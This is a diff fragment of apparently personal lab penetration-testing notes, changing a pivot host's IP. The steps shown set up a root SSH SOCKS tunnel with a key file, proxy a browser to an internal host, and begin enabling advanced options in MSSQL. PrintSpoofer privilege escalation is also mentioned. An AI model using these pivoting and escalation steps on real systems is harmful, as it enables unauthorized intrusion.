@@ -66,7 +66,7 @@ looks like were gonna need to copy printspoofer over again and run all the steps
 
 
 1) clear all old stuff. 
-2) ssh -D 9050 root@10.129.248.159 -i rootkey
+2) ssh -D 9050 root@10.129.82.126 -i rootkey
 3) in new terminal -> proxychains firefox 172.16.8.20 -> wait for it to open 
 4) go to settings -> sql console -> type: 
 EXEC sp_configure 'show advanced options', '1'
